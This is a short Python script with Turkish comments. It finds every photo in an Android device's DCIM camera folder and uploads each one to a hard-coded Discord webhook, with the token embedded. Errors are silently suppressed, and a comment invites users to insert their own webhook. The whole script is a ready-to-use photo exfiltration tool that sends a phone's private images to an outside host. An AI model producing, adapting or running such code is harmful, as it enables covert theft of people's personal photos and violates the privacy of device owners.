import os
import requests
import time
from tqdm import tqdm

WEBHOOK_URL = "https://discord.com/api/webhooks/1414709102415708260/fchkKmLpaYQDW09genXyEsvB3V6eerwvAuVxBPeQlve6h8sD31aowoM2pLbTefuWe0pl"  # Kendi webhook adresini buraya yaz

def send_to_discord(image_path):
    try:
        with open(image_path, "rb") as f:
            files = {"file": f}
            requests.post(WEBHOOK_URL, files=files, timeout=10)
    except Exception:
        pass  # Hata olursa geç

def main():
    image_dir = "/storage/emulated/0/DCIM/"
    image_files = []
    for root, dirs, files in os.walk(image_dir):
        for file in files:
            if file.lower().endswith((".jpg", ".jpeg", ".png")):
                image_files.append(os.path.join(root, file))

    print(f"Toplam {len(image_files)} fotoğraf bulundu. Gönderiliyor...")

    # Fotoğrafları sırayla, 1 saniyede bir gönder
    for image_path in tqdm(image_files, desc="YÜKLENİYOR", unit="foto"):
        send_to_discord(image_path)
        time.sleep(1)  # Her fotoğraf arasında 1 saniye bekle

if __name__ == "__main__":
    main()
